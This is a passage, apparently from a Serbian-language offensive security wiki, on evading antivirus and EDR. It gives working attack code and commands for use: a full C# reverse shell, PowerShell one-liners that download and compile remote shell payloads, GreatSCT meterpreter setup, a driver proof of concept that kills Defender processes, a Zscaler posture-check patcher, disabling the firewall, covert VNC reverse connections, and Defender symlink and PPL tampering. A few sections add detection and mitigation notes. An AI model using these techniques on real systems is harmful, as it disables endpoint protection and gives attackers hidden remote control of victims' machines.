Možda ste videli ovaj ekran kada preuzimate neke executables sa interneta i izvršavate ih.

Microsoft Defender SmartScreen je sigurnosni mehanizam namenjen da zaštiti krajnjeg korisnika od pokretanja potencijalno malicioznih aplikacija.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom radi po pristupu zasnovanom na reputaciji, što znači da će neobično preuzimane aplikacije pokrenuti SmartScreen, čime se krajnji korisnik upozorava i sprečava da izvrši fajl (iako se fajl i dalje može izvršiti klikom na More Info -> Run anyway).

**MoTW** (Mark of The Web) je [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) pod imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja fajlova sa interneta, zajedno sa URL-om sa kojeg je preuzet.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Provera Zone.Identifier ADS-a za fajl preuzet sa interneta.</p></figcaption></figure>

> [!TIP]
> Važno je napomenuti da executables potpisani **trusted** signing certificate-om **neće pokrenuti SmartScreen**.

Veoma efikasan način da sprečite da vaši payloads dobiju Mark of The Web je da ih spakujete unutar nekog kontejnera kao što je ISO. Ovo se dešava zato što Mark-of-the-Web (MOTW) **ne može** da se primeni na volumene koji **nisu NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakira payloads u izlazne kontejnere kako bi se izbegao Mark-of-the-Web.

Primer upotrebe:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Evo demonstracije za zaobilaženje SmartScreen-a pakovanjem payload-ova unutar ISO fajlova koristeći [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) je moćan mehanizam za logovanje u Windows-u koji aplikacijama i sistemskim komponentama omogućava da **loguju događaje**. Međutim, sigurnosni proizvodi ga takođe mogu koristiti za nadzor i detekciju malicioznih aktivnosti.

Slično kao što se AMSI isključuje (bypassed), moguće je i naterati funkciju **`EtwEventWrite`** procesa u user space-u da se odmah vrati bez logovanja bilo kakvih događaja. Ovo se radi patchovanjem funkcije u memoriji tako da se odmah vrati, čime se ETW logovanje efektivno onemogućava za taj proces.

Možete pronaći više informacija u **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Učitavanje C# binary-ja u memoriju je poznato već dosta dugo i i dalje je veoma dobar način za pokretanje vaših post-exploitation alata bez da vas AV otkrije.

Pošto će se payload učitati direktno u memoriju bez dodirivanja diska, moraćemo da brinemo samo o patchovanju AMSI-ja za ceo proces.

Većina C2 framework-ova (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već pruža mogućnost direktnog izvršavanja C# assembly-ja u memoriji, ali postoje različiti načini da se to uradi:

- **Fork\&Run**

Podrazumeva **pokretanje novog žrtvovanog procesa**, injektovanje vašeg malicioznog post-exploitation koda u taj novi proces, izvršavanje malicioznog koda i, kada se završi, gašenje novog procesa. Ovo ima i prednosti i mane. Prednost metode fork and run je što se izvršavanje odvija **van** našeg Beacon implant procesa. To znači da, ako nešto pođe naopako u našoj post-exploitation akciji ili bude otkriveno, postoji **mnogo veća šansa** da će naš **implant preživeti.** Mana je da imate **mnogo veću šansu** da vas otkriju **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Radi se o injektovanju malicioznog post-exploitation koda **u sopstveni proces**. Na ovaj način možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV-a, ali mana je što, ako nešto krene naopako tokom izvršavanja vašeg payload-a, postoji **mnogo veća šansa** da ćete **izgubiti beacon** jer može doći do pada procesa.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ako želite da pročitate više o C# Assembly loading-u, pogledajte ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Takođe možete učitavati C# Assemblies **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [S3cur3th1sSh1t-ov video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Korišćenje drugih programskih jezika

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršavati maliciozni kod koristeći druge jezike tako što se kompromitovanoj mašini da pristup **interpreter okruženju instaliranom na Attacker Controlled SMB share-u**.

Dozvoljavanjem pristupa Interpreter Binary-jevima i okruženju na SMB share-u možete **izvršavati proizvoljan kod u tim jezicima unutar memorije** kompromitovane mašine.

Repo navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti za zaobilaženje statičkih signatura**. Testiranje sa nasumičnim, ne-obfuskiranim reverse shell skriptama u ovim jezicima pokazalo je uspeh.

## TokenStomping

Token stomping je tehnika koja napadaču omogućava da **manipuliše access token-om ili security proizvodom kao što je EDR ili AV**, omogućavajući mu da smanji privilegije tako da proces ne padne, ali nema dozvole da proverava maliciozne aktivnosti.

Da bi se ovo sprečilo, Windows bi mogao da **onemogući eksternim procesima** da dobijaju handle-ove nad tokenima security procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Korišćenje trusted softvera

### Chrome Remote Desktop

Kao što je opisano u [**ovom blog postu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je jednostavno postaviti Chrome Remote Desktop na računar žrtve i zatim ga koristiti za preuzimanje kontrole i održavanje persistence:
1. Preuzmite sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", a zatim kliknite na MSI fajl za Windows da biste preuzeli MSI fajl.
2. Pokrenite instalater tiho na žrtvi (potreban admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na Chrome Remote Desktop stranicu i kliknite next. Čarobnjak će zatim tražiti da autorizujete; kliknite na dugme Authorize da nastavite.
4. Izvršite dati parametar uz neke izmene: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Napomena: pin parametar omogućava podešavanje pina bez korišćenja GUI-ja).


## Advanced Evasion

Evasion je veoma komplikovana tema, ponekad morate uzeti u obzir mnoge različite izvore telemetrije na samo jednom sistemu, pa je praktično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kojeg radite imaće sopstvene prednosti i slabosti.

Snažno vas podstičem da pogledate ovaj talk od [@ATTL4S](https://twitter.com/DaniLJ94), kako biste stekli uporište za naprednije Evasion tehnike.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe još jedno sjajno predavanje od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Proverite koje delove Defender smatra malicioznim**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **uklanjati delove binary-ja** dok **ne otkrije koji deo Defender** smatra malicioznim i podeli ga vama.\
Još jedan alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa otvorenim web servisom na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows10, svi Windows-i su dolazili sa **Telnet serverom** koji ste mogli instalirati (kao administrator) na sledeći način:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** kada se sistem startuje i **izvrši** sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (stealth) i onemogući firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (želite bin preuzimanja, ne setup)

**NA HOSTU**: Izvršite _**winvnc.exe**_ i konfigurišite server:

- Omogućite opciju _Disable TrayIcon_
- Postavite lozinku u _VNC Password_
- Postavite lozinku u _View-Only Password_

Zatim premestite binary _**winvnc.exe**_ i **novokreiranu** datoteku _**UltraVNC.ini**_ unutar **victim**

#### **Reverse connection**

**attacker** treba da **izvrši unutar** svog **host** binary `vncviewer.exe -listen 5900` kako bi bio **spreman** da uhvati reverse **VNC connection**. Zatim, unutar **victim**: Pokrenite winvnc daemon `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPOZORENJE:** Da biste zadržali stealth, ne smete da uradite nekoliko stvari

- Nemojte pokretati `winvnc` ako već radi ili ćete pokrenuti [popup](https://i.imgur.com/1SROTTl.png). proverite da li radi sa `tasklist | findstr winvnc`
- Nemojte pokretati `winvnc` bez `UltraVNC.ini` u istom direktorijumu ili će to izazvati da se otvori [the config window](https://i.imgur.com/rfMQWcf.png)
- Nemojte pokretati `winvnc -h` za pomoć ili ćete pokrenuti [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokreni lister** sa `msfconsole -r file.rc` i **izvrši** **xml payload** sa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni defender će vrlo brzo terminisati proces.**

### Kompajliranje našeg sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga sa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristi ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje python za build injectors primer:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 iskoristio je mali konzolni alat poznat kao **Antivirus Terminator** da onemogući endpoint zaštite pre nego što je izbacio ransomware. Alat donosi svoj **vulnerable** ali *signed* driver i zloupotrebljava ga za izdavanje privilegovanih kernel operacija koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu da blokiraju.

Ključne napomene
1. **Signed driver**: Datoteka koja se isporučuje na disk je `ServiceMouse.sys`, ali binarno je to legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs “System In-Depth Analysis Toolkit”. Pošto driver ima važeći Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prva linija registruje driver kao **kernel servis**, a druga ga pokreće tako da `\\.\ServiceMouse` postane dostupan iz user land.
3. **IOCTLs koje driver izlaže**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminira proizvoljan proces po PID-u (koristi se za ubijanje Defender/EDR servisa) |
| `0x990000D0` | Briše proizvoljnu datoteku sa diska |
| `0x990001D0` | Učitava driver i uklanja servis |

Minimalni C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto radi**:  BYOVD potpuno preskače user-mode zaštite; kod koji se izvršava u kernelu može da otvara *protected* procese, terminira ih ili menja kernel objekte bez obzira na PPL/PP, ELAM ili druge hardening funkcije.

Detekcija / Mitigacija
•  Omogućite Microsoftovu vulnerable-driver block list (`HVCI`, `Smart App Control`) tako da Windows odbija da učita `AToolsKrnl64.sys`.
•  Pratite kreiranje novih *kernel* servisa i alarmirajte kada se driver učitava iz direktorijuma koji je world-writable ili nije na allow-listi.
•  Pratite user-mode handle-ove ka custom device objektima nakon kojih slede sumnjivi `DeviceIoControl` pozivi.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler **Client Connector** lokalno primenjuje device-posture pravila i oslanja se na Windows RPC da prenese rezultate drugim komponentama. Dve slabe dizajnerske odluke omogućavaju potpuni bypass:

1. Provera posture-a se dešava **u potpunosti na klijentu** (na server se šalje boolean).
2. Interni RPC endpoint-i proveravaju samo da li je povezani izvršni fajl **potpisan od strane Zscalera** (preko `WinVerifyTrust`).

Patching-om četiri signed binarna fajla na disku mogu se neutralisati oba mehanizma:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1` tako da je svaka provera usklađena |
| `ZSAService.exe` | Indirektni poziv ka `WinVerifyTrust` | NOP-ed ⇒ bilo koji proces (čak i unsigned) može da se binduje na RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritetske provere tunela | Short-circuited |

Minimalni patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih fajlova i ponovnog pokretanja service stack-a:

* **Sve** posture provere prikazuju **green/compliant**.
* Nepotpisani ili izmenjeni binaries mogu da otvore named-pipe RPC endpoints (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internoj mreži definisanoj Zscaler politikama.

Ova case study pokazuje kako se odluke o poverenju koje su isključivo na client-side i jednostavne signature provere mogu zaobići sa nekoliko byte patch-eva.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) nameće signer/level hijerarhiju tako da samo procese sa jednakim ili višim nivoom zaštite mogu da tamper with each other. Offensively, ako možeš legitimno da pokreneš PPL-enabled binary i kontrolišeš njegove arguments, možeš pretvoriti benign functionality (npr. logging) u ograničen, PPL-backed write primitive protiv zaštićenih direktorijuma koje koriste AV/EDR.

Šta čini da proces radi kao PPL
- Target EXE (i svaki učitani DLL) moraju biti potpisani sa PPL-capable EKU.
- Proces mora biti kreiran sa CreateProcess koristeći flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Mora se zahtevati kompatibilan protection level koji odgovara signer-u binary-ja (npr., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` za anti-malware signers, `PROTECTION_LEVEL_WINDOWS` za Windows signers). Pogrešni nivoi će fail-ovati pri kreiranju.

Pogledaj i širi uvod u PP/PPL i LSASS protection ovde:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (bira protection level i prosleđuje arguments target EXE-u):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Potpisani sistemski binarijum `C:\Windows\System32\ClipUp.exe` sam pokreće sebe i prihvata parametar za upis log fajla na putanju koju zada pozivalac.
- Kada se pokrene kao PPL proces, upis fajla se izvršava uz PPL backing.
- ClipUp ne može da parsira putanje koje sadrže razmake; koristi 8.3 short paths da bi pokazao na normalno zaštićene lokacije.

8.3 short path helpers
- Prikaži short names: `dir /x` u svakom parent direktorijumu.
- Izvedi short path u cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Pokreni PPL-capable LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` pomoću launchera (npr. CreateProcessAsPPL).
2) Prosledi ClipUp log-path argument da bi se forsiralo kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Koristi 8.3 short names ako je potrebno.
3) Ako je ciljni binarijum normalno otvoren/zaključan od strane AV-a dok radi (npr. MsMpEng.exe), zakaži upis pri boot-u pre nego što AV startuje tako što ćeš instalirati auto-start servis koji pouzdano radi ranije. Validiraj boot ordering uz Process Monitor (boot logging).
4) Pri reboot-u PPL-backed upis se dešava pre nego što AV zaključa svoje binarijume, korumpira ciljnu datoteku i sprečava startovanje.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Napomene i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje osim pozicioniranja; primitivan mehanizam je namenjen korupciji, a ne preciznoj injekciji sadržaja.
- Zahteva lokalni admin/SYSTEM da bi se instalirao/pokrenuo service i reboot prozor.
- Vreme je kritično: cilj ne sme biti otvoren; izvršavanje tokom boota izbegava file lock-ove.

Detekcije
- Process creation `ClipUp.exe` sa neuobičajenim argumentima, posebno kada ga pokreću nestandardni launcher-i, oko boota.
- Novi service-i podešeni da se auto-startuju sa sumnjivim binary-jem i koji dosledno startuju pre Defender/AV. Istražite kreiranje/modifikaciju service-a pre Defender startup grešaka.
- File integrity monitoring nad Defender binary-jem/Platform direktorijumima; neočekivano kreiranje/modifikacije fajlova od strane procesa sa protected-process flag-ovima.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalnu upotrebu PPL nivoa od strane binary-ja koji nisu AV.

Mitigacije
- WDAC/Code Integrity: ograničite koji signed binary-ji smeju da se pokreću kao PPL i pod kojim parent procesima; blokirajte `ClipUp` pozivanje van legitimnih konteksta.
- Service hygiene: ograničite kreiranje/modifikaciju auto-start service-a i pratite manipulaciju start-order-a.
- Osigurajte da su Defender tamper protection i early-launch protections omogućeni; istražite startup greške koje ukazuju na korupciju binary-ja.
- Razmislite o onemogućavanju 8.3 short-name generisanja na volume-ima koji hostuju security tooling ako je kompatibilno sa vašim okruženjem (testirajte temeljno).

Reference za PPL i tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender bira platformu iz koje radi tako što enumeriše podfoldere pod:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Bira podfolder sa najvišim leksikografskim version string-om (npr. `4.18.25070.5-0`), a zatim pokreće Defender service procese odatle (ažurirajući service/registry putanje u skladu s tim). Ovaj izbor veruje directory entries, uključujući directory reparse point-ove (symlink-ove). Administrator to može iskoristiti da preusmeri Defender na attacker-writable path i postigne DLL sideloading ili service disruption.

Preduslovi
- Local Administrator (potreban za kreiranje direktorijuma/symlink-ova unutar Platform foldera)
- Mogućnost reboot-a ili okidanja Defender platform re-selection (service restart na boot-u)
- Potrebni su samo built-in alati (mklink)

Zašto radi
- Defender blokira pisanje u svojim folderima, ali njegov platform selection veruje directory entries i bira leksikografski najvišu verziju bez validacije da li target vodi ka protected/trusted path-u.

Korak po korak (primer)
1) Pripremite writable clone trenutnog platform foldera, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte symlink direktorijuma više verzije unutar Platform koji pokazuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor trigera (reboot preporučen):
```cmd
shutdown /r /t 0
```
4) Proverite da li MsMpEng.exe (WinDefend) radi iz preusmerene putanje:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Trebalo bi da posmatrate novu putanju procesa pod `C:\TMP\AV\` i konfiguraciju servisa/registry koja odražava tu lokaciju.

Post-exploitation opcije
- DLL sideloading/code execution: Postavite/zamenite DLL-ove koje Defender učitava iz svog application directory da biste izvršili code u Defender procesima. Pogledajte gornji odeljak: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink tako da pri sledećem pokretanju konfigurisana putanja ne može da se razreši i Defender ne uspe da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne obezbeđuje privilege escalation; zahteva admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams mogu da prebace runtime evasion iz C2 implant-a u sam target modul tako što će hook-ovati njegov Import Address Table (IAT) i preusmeravati odabrane APIs kroz attacker-controlled, position‑independent code (PIC). Ovo generalizuje evasion izvan male API površine koju mnogi kits izlažu (npr. CreateProcessA), i proširuje iste zaštite na BOFs i post-exploitation DLLs.

High-level approach
- Postavite PIC blob pored target modula koristeći reflective loader (prepended ili companion). PIC mora biti self-contained i position-independent.
